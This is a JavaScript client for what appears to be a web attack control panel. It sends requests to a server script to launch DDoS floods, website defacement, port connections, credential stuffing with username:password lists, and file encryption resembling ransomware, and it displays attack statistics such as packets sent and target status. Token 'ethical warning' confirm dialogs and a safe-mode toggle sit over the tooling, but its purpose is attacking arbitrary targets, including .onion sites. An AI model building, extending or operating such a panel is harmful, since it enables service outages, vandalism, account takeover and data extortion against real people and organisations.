function showTab(tabId) {
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(tab => tab.style.display = 'none');
    document.getElementById(tabId).style.display = 'block';

    // Update URL hash for direct linking
    window.location.hash = tabId;
}

// Automatically show tab if hash is present
window.onload = function() {
    if (window.location.hash) {
        showTab(window.location.hash.substring(1)); // Remove the '#'
    }
};


async function fetchData(url, options) {
    try {
        const response = await fetch(url, options);
        if (!response.ok) {
            const message = `An error occurred: ${response.status}`;
            throw new Error(message);
        }
        try {
            const contentType = response.headers.get("content-type");
            if (contentType && contentType.includes("application/json")) {
                return await response.json();
            } else {
                return await response.text();
            }
        } catch (e) {
            return await response.text();
        }
    } catch (error) {
        console.error('Fetch error:', error);
        alert('Fetch error: ' + error.message);
        throw error;
    }
}

async function startDDoS() {
    // ETHICAL WARNING
    if (!confirm("WARNING: DDoS attacks are illegal without explicit permission. Do you have permission to test this target? This tool is for ethical testing ONLY.")) {
        alert("DDoS attack aborted.");
        return;
    }

    const target = document.getElementById('ddos-target').value;
    if (!target) {
        alert('Please enter a target URL or .onion address.');
        return;
    }

    // Rate limiting (example: 10 requests per second)
    const rateLimit = 10;
    let requestCount = 0;
    let startTime = Date.now();

    try {
        const intervalId = setInterval(async () => {
            if (requestCount < rateLimit) {
                requestCount++;
                await fetchData('main/attack.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `target=${encodeURIComponent(target)}&attackType=ddos`
                }).then(data => {
                    if (typeof data === 'object' && data !== null && data.status === 'success') {
                        updateStatistics(data);
                        logAction(`DDoS attack on ${target} - Packet sent`); // Log the action
                    } else {
                        console.error('DDoS attack failed:', data); // Log to console instead of alert
                        logAction(`DDoS attack on ${target} - Failed: ${data}`); // Log the failure
                    }
                }).catch(error => {
                    console.error('DDoS error:', error);
                    logAction(`DDoS attack on ${target} - Error: ${error}`); // Log the error
                });
            } else {
                const elapsedTime = Date.now() - startTime;
                if (elapsedTime < 1000) {
                    console.warn('Rate limit exceeded. Waiting...'); // Log warning to console
                } else {
                    requestCount = 0; // Reset counter after 1 second
                    startTime = Date.now();
                }
            }
        }, 100); // Check every 100ms

        // Automatic stop after 10 seconds (for testing)
        setTimeout(() => {
            clearInterval(intervalId);
            alert('DDoS simulation stopped after 10 seconds.');
            logAction(`DDoS attack on ${target} - Stopped after 10 seconds`); // Log stop
        }, 10000);

    } catch (error) {
        clearInterval(intervalId); // Ensure interval is cleared on error
        console.error('DDoS error:', error);
        alert('An error occurred while initiating the DDoS attack: ' + error.message);
        logAction(`DDoS attack on ${target} - Initialization error: ${error}`); // Log init error
    }
}

async function startDefacement() {
    // ETHICAL WARNING
    if (!confirm("WARNING: Defacing websites without permission is illegal. Do you own this website and have permission to modify it?")) {
        alert("Defacement aborted.");
        return;
    }

    const target = document.getElementById('defacement-target').value;
    const content = document.getElementById('defacement-content').value;
    if (!target || !content) {
        alert('Please enter a target URL and defacement content.');
        return;
    }

    // Backup functionality (simulated - replace with actual backup)
    const backup = "Original website content (simulated)";
    console.log("Simulated backup: ", backup);


    // Preview Mode (Simulated - display content in a modal)
    const previewContent = `
        <div style="background-color: #222; color: #f00; padding: 20px; border: 1px solid #f00; font-family: monospace;">
            ${content}
        </div>
    `;
    document.getElementById('preview-container').innerHTML = previewContent;
    document.getElementById('preview-modal').style.display = 'block';
    document.getElementById('preview-accept').onclick = async () => {
      document.getElementById('preview-modal').style.display = 'none';
      try {
          const data = await fetchData('main/attack.php', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
              },
              body: `target=${encodeURIComponent(target)}&attackType=defacement&content=${encodeURIComponent(content)}`
          });

          if (typeof data === 'string' && data.includes('Defacement successful')) {
              alert('Defacement successful!');
              logAction(`Defacement of ${target} - Successful`); // Log success
          } else {
              alert('Defacement failed: ' + (typeof data === 'object' && data !== null && data.message ? data.message : data));
              logAction(`Defacement of ${target} - Failed: ${data}`); // Log failure
          }
      } catch (error) {
          console.error('Defacement error:', error);
          alert('An error occurred while initiating the defacement: ' + error.message);
          logAction(`Defacement of ${target} - Error: ${error}`); // Log error
      }
    };
    document.getElementById('preview-cancel').onclick = () => {
      document.getElementById('preview-modal').style.display = 'none';
    };
}


async function establishConnection() {
    // ETHICAL WARNING
    if (!confirm("WARNING: Establishing unauthorized connections is illegal. Do you have permission to connect to this target?")) {
        alert("Connection aborted.");
        return;
    }

    const target = document.getElementById('connection-target').value;
    const port = document.getElementById('connection-port').value;
    if (!target || !port) {
        alert('Please enter a target IP/URL and port.');
        return;
    }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(target)}&attackType=connection&port=${encodeURIComponent(port)}`
        });

        if (typeof data === 'string' && data.includes('Connection established')) {
            alert('Connection established!');
            logAction(`Connection to ${target}:${port} - Successful`); // Log success
        } else {
            alert('Connection failed: ' + (typeof data === 'object' && data !== null && data.message ? data.message : data));
            logAction(`Connection to ${target}:${port} - Failed: ${data}`); // Log failure
        }
    } catch (error) {
        console.error('Connection error:', error);
        alert('An error occurred while establishing the connection: ' + error.message);
        logAction(`Connection to ${target}:${port} - Error: ${error}`); // Log error
    }
}

async function startCredentialStuffing() {
    // ETHICAL WARNING
    if (!confirm("WARNING: Credential stuffing without permission is illegal. Do you have explicit permission to test this target? This tool is for ethical testing ONLY. Use a test account you own. NEVER use stolen credentials.")) {
        alert("Credential stuffing aborted.");
        return;
    }

    const target = document.getElementById('credential-target').value;
    const credentials = document.getElementById('credential-list').value;
    if (!target || !credentials) {
        alert('Please enter a target URL and a username:password list.');
        return;
    }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(target)}&attackType=credentialStuffing&credentials=${encodeURIComponent(credentials)}`
        });

        if (typeof data === 'string' && data.includes('Credential stuffing started')) {
            alert('Credential stuffing started!');
            logAction(`Credential stuffing on ${target} - Started`); // Log start
        } else {
            alert('Credential stuffing failed: ' + (typeof data === 'object' && data !== null && data.message ? data.message : data));
            logAction(`Credential stuffing on ${target} - Failed: ${data}`); // Log failure
        }
    } catch (error) {
        console.error('Credential stuffing error:', error);
        alert('An error occurred while initiating credential stuffing: ' + error.message);
        logAction(`Credential stuffing on ${target} - Error: ${error}`); // Log error
    }
}


async function startEncryption() {
  if (!confirm("WARNING: Encryption without proper knowledge can lead to data loss. Make sure you have backups and understand the process.")) {
      alert("Encryption aborted.");
      return;
  }

  const targetFile = document.getElementById('encryption-target').value;
  const encryptionKey = document.getElementById('encryption-key').value;
  if (!targetFile || !encryptionKey) {
      alert('Please enter a target file and an encryption key.');
      return;
  }

    try {
        const data = await fetchData('main/attack.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target=${encodeURIComponent(targetFile)}&attackType=encryption&key=${encodeURIComponent(encryptionKey)}`
        });

        if (typeof data === 'string' && data.includes('Encryption started')) {
            alert('Encryption started!');
            logAction(`Encryption of ${targetFile} - Started`); // Log start
        } else {
            alert('Encryption failed: ' + (typeof data === 'object' && data !== null && data.message ? data.message : data));
            logAction(`Encryption of ${targetFile} - Failed: ${data}`); // Log failure
        }
    } catch (error) {
        console.error('Encryption error:', error);
        alert('An error occurred while initiating encryption: ' + error.message);
        logAction(`Encryption of ${targetFile} - Error: ${error}`); // Log error
    }
}

function updateStatistics(data) {
    if (typeof data === 'object' && data !== null) {
        document.getElementById('mbps').innerText = data.mbps || 'N/A';
        document.getElementById('packets-sent').innerText = data.packetsSent || 'N/A';
        document.getElementById('target-status').innerText = data.targetStatus || 'N/A';
        document.getElementById('time-elapsed').innerText = data.timeElapsed || 'N/A';
    }
}

// Add safe mode toggle functionality
document.getElementById('safe-mode').addEventListener('change', function() {
    if (this.checked) {
        alert("Safe mode enabled. All tests will be performed against localhost or dummy targets.");
        // Update target fields to localhost or dummy targets
        document.getElementById('ddos-target').value = 'http://localhost';
        document.getElementById('defacement-target').value = 'http://localhost';
        document.getElementById('connection-target').value = '127.0.0.1';
        logAction('Safe mode enabled'); // Log safe mode enabled
    } else {
        alert("Safe mode disabled. Be careful and ensure you have explicit permission to test targets.");
        // Optionally clear the target fields
        document.getElementById('ddos-target').value = '';
        document.getElementById('defacement-target').value = '';
        document.getElementById('connection-target').value = '';
        logAction('Safe mode disabled'); // Log safe mode disabled
    }
});

// Function to log actions
function logAction(message) {
    fetchData('main/log.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `action=${encodeURIComponent(message)}`
    }).catch(error => {
        console.error('Logging error:', error);
        alert('Logging error: ' + error.message);
    });
}